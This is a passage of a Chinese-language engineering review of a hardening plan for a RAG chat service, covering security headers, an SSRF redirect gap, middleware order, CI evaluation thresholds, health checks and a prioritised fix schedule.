- `POST /api/chat` 加 `asyncio.wait_for(graph.ainvoke(...), timeout=settings.chat_timeout)`（默认 30s），超时抛 `ChatTimeoutError(RAGError, http_status=504, error_code="chat_timeout")` —— 这条**应该加到 11 条错误矩阵变成 12 条**

---

### X-2 · M12 plan 没引用 / 解决 M5 review P0-1 SSRF redirect bypass 在 hardening 二次校验

**M5 review P0-1**（L35-96）：`assert_safe_url` 只校验初始 URL，redirect 目标未校验

**M12 hardening 应加**：
- 安全头 `Content-Security-Policy: form-action 'self'`（防 form submit 重定向到恶意域）
- `Referrer-Policy: strict-origin-when-cross-origin`（plan 已写 ✓）
- 备份 `infra/backup/os_snapshot.sh` **不应**通过 URL 抓取数据（spec §8.3 backup 用 snapshot API，安全）

**修改**：在 CSP 头补 `form-action 'self'; base-uri 'self';`

---

### X-3 · M11 review P0-5 RAGAS 20 题统计不稳定性 —— M12 CI gate 直接踩

**M11 review P0-5**（L280-298）：CI gate `faithfulness < 0.7` 在 20 题样本下统计不稳定性未论证

**M12 Task 21 L1149-1150 直接**：
```
--sample-size 20 --threshold 0.7
```

**问题**：20 题下 faithfulness 抖动 ±0.05，CI 假阳/假阴率高。

**修改**：
- 短期：threshold 降到 0.65（M11 阈值本来就是建议值）
- 中期：3 次连续 nightly 跑下来取 moving average，再决定是否恢复 0.7
- plan DoD 加一条 "nightly faithfulness 报告必须保留 30 天 baseline，PR 触发时与 baseline diff 超过 ±0.05 报警"

---

### X-4 · M9 review CORS / Gradio UI 5.0+ 与 M12 中间件顺序矛盾

**M9 review**（review doc 36 段落）：Gradio 5.0+ CSP 兼容是 P0 避雷点

**M12 Task 6 GREEN 段** CSP 含 `'unsafe-inline'`（plan ✓ 正确）

**但** spec §3.12 L396 写中间件顺序 `RateLimit → SecurityHeaders → RequestID → CORSMiddleware`，plan 写成 `request_id → security_headers → rate_limit → error_handler`（**顺序错误**，见 P0-1）。修正后：
- SecurityHeaders 在 RateLimit 之后 → 429 响应**不带 CSP 头**（OK，错误响应无需 CSP）
- 但 5xx 错误响应**会带 CSP 头**（OK，错误页面也要防 XSS）

---

### X-5 · M2 review P1-9 `validate_token_expiry` 竞争 → M12 extend_session 触发更频繁

**M2 review P1-9**（L319-327）：`datetime.now()` 双调用竞争

**M12 Task 9** 让 `extend_session` 仍走 fire-and-forget——意味着**每次 chat 请求都触发 extend_session**，竞争窗口被放大。

**修改**：M12 Task 9 RED 测试加：
```python
async def test_extend_session_uses_single_datetime_now_call():
    """竞争窗口验证：两次 now() 差异 < 1ms"""
    # 用 freezegun 或 mock 验证只有一次 datetime.now() 调用
```

---

### X-6 · M10 review P0-2/3 + M11 P0-6：trace_id API 不存在，M12 必须先打补丁

（见 P0-2，已详述）

---

### X-7 · plan 风险表与实际风险脱节

**plan 风险表列了 12 条**，但实际**严重遗漏**：
1. **慢 api 在多 worker 进程下慢限制失效**（见 P2-1）—— **未列入风险表**
2. **5xx 错误响应也会消耗 rate limit 配额**（见 P1-1）—— **未列入**
3. **CI `sleep 30` 脆性**（见 P1-8）—— **未列入**
4. **prod `docker compose up -d` 没 `--wait`** —— **未列入**
5. **`request.state.request_id` 链路断裂**（M8/M10/M11 跨 M 链路）—— **未列入**
6. **CSP `unsafe-inline` 与 XSS 风险** —— **未列入**

---

## 与既有 Review 交叉验证

| 来源 Review | P0/P1 编号 | M12 plan 是否已纳入 | 状态 |
|---|---|---|---|
| plans-review | P0-1 端口冲突 | Task 17 `expose:` 无 ports | ✅ 已纳入 |
| plans-review | P0-5 真 PG | Task 21 services.postgres | ✅ 已纳入 |
| plans-review | P1-7 Argon2 参数 | Task 8 time=3 memory=65536 | ✅ 已纳入 |
| plans-review | X-4 prod env 注入 | Task 17 docker secrets | ✅ 已纳入 |
| plans-review | P1-3 明文密码 | 仅 dev override 沿用 | ⚠️ 部分 |
| M2 review | P1-9 双 now() 竞争 | Task 9 fire-and-forget | ⚠️ 未消解 |
| M5 review | P0-1 SSRF redirect | hardening 二次校验 | ⚠️ 未直接对应 |
| M8 review | P0-1 chat 超时 | 未涉及 | ❌ 遗漏 |
| M8 review | P0-2 lifespan engine.dispose | 未涉及 | ❌ 遗漏 |
| M8 review | P0-3 health check 5 service 实现 | Task 20 | ⚠️ 模糊（具体超时/URL 未写） |
| M9 review | CORS / Gradio 5.0+ | CSP unsafe-inline | ✅ |
| M10 review | P0-2/3 trace_id API | 直接 import 用 | ❌ **踩雷** |
| M10 review | P1-4 Langfuse 不可达降级 | Task 20 check_langfuse 用 HTTP | ⚠️ 部分 |
| M10 review | P2-1 flush_timeout=1.0 | 未涉及 | ❌ 遗漏 |
| M11 review | P0-6 get_current_trace_id | 直接 import 用 | ❌ **踩雷** |
| M11 review | P0-5 20 题统计稳定性 | Task 21 sample-size 20 | ⚠️ 未消解 |
| M11 review | P2-4 judge LLM 不接 Langfuse callback | 未涉及 | ❌ 遗漏 |

**结论**：13 条 cross-cutting 警告里，**5 条 ❌ 完全未纳入**，**6 条 ⚠️ 部分**，**4 条 ✅**。

---

## 新发现问题（任务列表外）

| 编号 | 问题 | 建议 |
|---|---|---|
| NEW-1 | 缺 `X-Request-Id` 全链路文档（HTTP→Sentry tag→Langfuse metadata→日志） | Task 28 新增 |
| NEW-2 | 缺 token 主动撤销（force logout by admin） | spec §9 决策表 "V1 不做"，**plan 风险表应声明** |
| NEW-3 | 缺 Secrets 注入工具（Vault / SOPS），plan 用 docker secrets 但没 SOP | infra/README.md 补 "secret rotation 流程" |
| NEW-4 | 缺 container resource limit 对所有 service（plan 只在 prod compose 加） | base `docker-compose.yml` 也加 dev limit |
| NEW-5 | health check 5 service 实际探测 URL/timeout 未定（spec 只列 service 名） | Task 20 GREEN 段给具体值 |
| NEW-6 | 缺 cold start 友好（TEI bge-m3 预热 / 启动时 sleep 避免 health false-down） | Task 25 prod smoke 加 `curl --retry 5` |
| NEW-7 | 缺 graceful shutdown（ASGI lifespan signal handler） | 见 X-1 |
| NEW-8 | 缺 SIGTERM handler（k8s pod 终止时 inflight request 处理） | 见 X-1 |
| NEW-9 | 缺 backup encryption at rest（MinIO bucket SSE-S3 没启用） | Task 13 backup 脚本加 SSE config |
| NEW-10 | 缺 `restore.sh` 脚本细节（DR drill 流程：写测试数据 → 备份 → 删 → 恢复 → 比对） | Task 16 已写 OK |
| NEW-11 | 缺 Sentry 采样率 / PII filter 配置 | 见 P1-5 |
| NEW-12 | 缺 doc-level alert（indexed docs 数突降 / faithfulness 下降） | spec §9 提了，plan 未落地 |
| NEW-13 | 缺 prod 与 dev 配置分离的 env 切换机制（仅 `ENV=development` 字符串判） | 用 `pydantic-settings` model 分离 |
| NEW-14 | 缺 SLO 定义（API 可用率 99.9% / chat P95 < 3s） | 至少在 plan DoD 写出来 |
| NEW-15 | 缺 on-call 手册（事故响应 / 回滚 SOP） | infra/README.md 补 |
| NEW-16 | 缺 metrics 导出（Prometheus）—— spec §9 写"V2 才做"，plan 至少要 risk 声明 | 风险表加 |
| NEW-17 | 缺 log 持久化（journald / docker log driver） | Task 17 logging driver 已用 json-file OK |
| NEW-18 | 缺 backup 验证自动化（不是手工演练） | CI 月度 cron job `test_backup_and_restore_roundtrip_preserves_data` |
| NEW-19 | `/api/health` 响应暴露 `services.{name}.error` 明文 → 可能泄漏内部栈 | 改 `error_code` + sanitized message |
| NEW-20 | 缺 `tear_down` 测试 fixture（testcontainers 关不干净 CI 资源） | `tests/integration/conftest.py` 显式 stop |

---

## 落地建议（按优先级）

### 第一波（P0，**动手前必关**）— 估计 4-6 小时

1. **P0-1**：中间件顺序按 spec §3.12 重写 + 补 CORSMiddleware
2. **P0-2**：M10 trace_id API 不存在 → 用 ContextVar 桥接
3. **P0-3**：Files 表补 `tests/unit/test_backup_scripts.py` + MinIO compose
4. **P0-4**：restore.sh 双门禁（`STAGING_CONFIRM=yes` + `ENV=staging`）

### 第二波（P1，**Task 实现时一起改**）— 估计 6-8 小时

5. **P1-1/2**：限速 key 按 user_id + X-Forwarded-For proxy-headers 配置
6. **P1-3**：CSP 严格按 spec §7.4（img-src 不放 https:）
7. **P1-4**：补 RateLimitedError 类 + Retry-After / X-RateLimit-* 头
8. **P1-5**：Sentry PII filter + dev 环境跳过
9. **P1-6**：check_graph 不跑业务，只测编译
10. **P1-7**：health check 超时 + 并行
11. **P1-8**：CI 用 `--wait` 替代 `sleep 30`
12. **P1-9**：MinIO creds 走 `_FILE` docker secrets
13. **P1-10**：health bypass 严格 exact path

### 第三波（P2 + 跨 M 收口，**可分散到 Day 1-5 各 task REFACTOR 阶段**）— 估计 4-6 小时

14. **X-1**：补 Task 26 lifespan hardening + chat 超时（错误矩阵变 12 条）
15. **X-3**：RAGAS 阈值 0.65 + moving average
16. **X-7**：plan 风险表补 6 条遗漏风险
17. **NEW-1/5/19**：X-Request-Id 链路文档 + health check 实际 URL/timeout + 错误响应脱敏
18. **P2-2/3/4/8/12**：Files 表 import 路径修正 + CI postgres-client 安装 + health 拆 live/ready + dev compose 注释 + prod security_opt

### 第四波（文档收口，**Day 4-5 最后半天**）

19. infra/README.md 补 on-call 手册 / secret rotation / backup drill SOP
20. DoD 加 SLO 定义（API 可用率 / chat P95 / RAGAS faithfulness baseline）

---

## 总结

**M12 plan 是 V1 收尾里程碑的高质量 plan**——结构齐 / TDD 红绿 / 主动吸收 plans-review 4 条 P0/P1——但**与 spec §3.12 直接矛盾**（中间件顺序）+ **直接踩 M10/M11 review 的雷**（trace_id API 不存在）+ **prod 部署细节缺失**（MinIO compose / chat 超时 / lifespan dispose）+ **CI 脆性**（sleep 30）+ **CSP 比 spec 宽松**——这些都不是"动手后慢慢改"能消解的，是 plan 层的偏差。

**强烈建议**：M12 实施前先按本 review 的"第一波 P0"改 plan，再开始 Task 1；过程中按"第二波 P1"随每个 Task REFACTOR 阶段消化；最后"第三波 + 第四波"作为 Day 5 收口。

整体评分：**⭐⭐⭐（3/5 · 实施就绪度门槛上）** —— 改完 P0 后可达 ⭐⭐⭐⭐⭐

---

## 修订记录

| 版本 | 日期 | 改动 |
|---|---|---|
| r0 | 2026-06-11 | 初稿（M12 hardening plan review · cross-validate spec §3.12/§7.4/§7.5/§8.3 + plans-review + M2/M5/M8/M10/M11 reviews） |